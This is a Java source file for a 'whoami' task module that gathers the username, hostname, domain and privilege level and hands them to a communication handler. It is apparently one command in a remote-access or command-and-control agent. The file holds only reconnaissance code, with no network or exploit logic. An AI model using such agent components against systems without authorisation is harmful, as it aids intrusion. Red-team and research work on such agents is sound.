package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;
import com.woopsie.utils.SystemInfo;

/**
 * Whoami task - returns current user information
 */
public class WhoamiTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        Config.debugLog(config, "Executing whoami command");
        
        // Get user information using SystemInfo
        String username = SystemInfo.getUsername();
        String hostname = SystemInfo.getHostname();
        String domain = SystemInfo.getDomain();
        int integrityLevel = SystemInfo.getIntegrityLevel();
        
        // Build response similar to oopsie
        StringBuilder response = new StringBuilder();
        response.append("Username: ").append(username).append("\n");
        response.append("Hostname: ").append(hostname).append("\n");
        response.append("Domain: ").append(domain).append("\n");
        
        // Determine privilege level
        String privileges;
        if (integrityLevel >= 3) {
            privileges = "Administrator/Root";
        } else {
            privileges = "User";
        }
        response.append("Privileges: ").append(privileges).append("\n");
        response.append("Integrity Level: ").append(integrityLevel);
        
        Config.debugLog(config, "Whoami result: " + response.toString());
        
        // Return raw output - CommunicationHandler will wrap it
        return response.toString();
    }
    
    @Override
    public String getCommandName() {
        return "whoami";
    }
}
